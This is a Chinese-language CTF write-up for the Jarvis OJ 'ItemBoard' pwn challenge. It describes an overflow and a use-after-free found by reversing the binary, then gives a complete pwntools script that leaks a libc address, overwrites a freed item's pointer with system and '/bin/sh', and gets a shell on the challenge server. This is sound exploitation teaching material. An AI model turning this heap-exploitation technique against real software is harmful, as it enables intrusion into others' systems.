---
title: Jarvis OJ - ItemBoard の Write-Up
date: 2020-10-20 16:45:47
categories:
- WriteUPs
- JarvisOJ
tags:
- PWN
- Heap
---
## Introduction

一道比较简单的堆溢出的题目，主要是配合测试下小工具[LibcOffset](https://github.com/Coldwave96/LibcOffset)，一个用来计算各个版本的libc文件main_arena offset的Python脚本。

<!-- more -->

程序运行截图：看起来是一道典型的堆溢出题目

![](/img/ItemBoard/ItemBoard1.png)

checksec：64位程序，有DEP和ASLR保护机制

![](/img/ItemBoard/ItemBoard2.png)

## Analysis

将程序通过IDA Pro逆向查看伪代码，首先是main函数：

![](/img/ItemBoard/ItemBoard3.png)

new_item函数创建新的item：

![](/img/ItemBoard/ItemBoard4.png)

list_item列出所有的item：

![](/img/ItemBoard/ItemBoard5.png)

show_item展示具体的item：

![](/img/ItemBoard/ItemBoard6.png)

remove_item函数删除item：

![](/img/ItemBoard/ItemBoard7.png)

通过初步的分析发现代码中存在两处问题：

* 一是在new_item函数中buf的大小是1024，但是函数中并没有限制content_len的大小，所以当输入内容超过buf大小之后会造成缓冲区溢出，被利用构造ROP Chain。

* 二是在remove_item函数中本该释放item指针的set_null函数实际上却是个空函数，所以实际上这个函数并没有什么用，存在UAF漏洞。

结合题目给出了libc.so文件，大体上的思路是利用UAF泄露基地址和libc地址，进而获取system函数的地址。再利用UAF或者ROP Chain执行system函数getshell。

利用自己编写的小工具[LibcOffset](https://github.com/Coldwave96/LibcOffset)查询本地以及题目给的libc文件的main_arena_offset。

本地调试环境：

![](/img/ItemBoard/ItemBoard8.png)

题目给的是glibc 2.19版本的：

![](/img/ItemBoard/ItemBoard9.png)

## Solution

这里只记录通过UAF get shell的方法：

```Python
# coding:utf-8
from pwn import *

local = 0

if local:
    sh = process('./itemboard')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    offset = 0x3c4b20
else:
    sh = remote('pwn2.jarvisoj.com', '9887')
    libc = ELF('./libc-2.19.so')
    offset = 0x3c2760

elf = ELF('./itemboard')

def Add(name, len, conts):
    sh.recvuntil('choose:\n')
    sh.sendline('1')
    sh.recvuntil('Item name?\n')
    sh.sendline(name)
    sh.recvuntil("Description's len?\n")
    sh.sendline(str(len))
    sh.recvuntil('Description?\n')
    sh.sendline(conts)

def List():
    sh.recvuntil('choose:\n')
    sh.sendline('2')

def Show(num):
    sh.recvuntil('choose:\n')
    sh.sendline('3')
    sh.recvuntil('Which item?\n')
    sh.sendline(str(num))

def Remove(num):
    sh.recvuntil('choose:\n')
    sh.sendline('4')
    sh.recvuntil('Which item?\n')
    sh.sendline(str(num))

# Libc地址 + system地址
Add('1', 0x80, 'a' * 8)
Add('2', 0x80, 'b' * 8)
Remove(0)
Show(0)

sh.recvuntil('Description:')
leak_addr = u64(sh.recv(6).ljust(8, '\x00'))

libc_addr = leak_addr - 88 - offset
sys_addr = libc_addr + libc.symbols['system']

# UAF get shell
Add('cccc', 32, 'cccc')
Add('dddd', 32, 'dddd')
Remove(2)
Remove(3)

Add('eeee', 24, '/bin/sh;' + 'eeeeeeee' + p64(sys_addr))
Remove(2)

sh.interactive()
sh.close()
```

运行结果：

![](/img/ItemBoard/ItemBoard10.png)
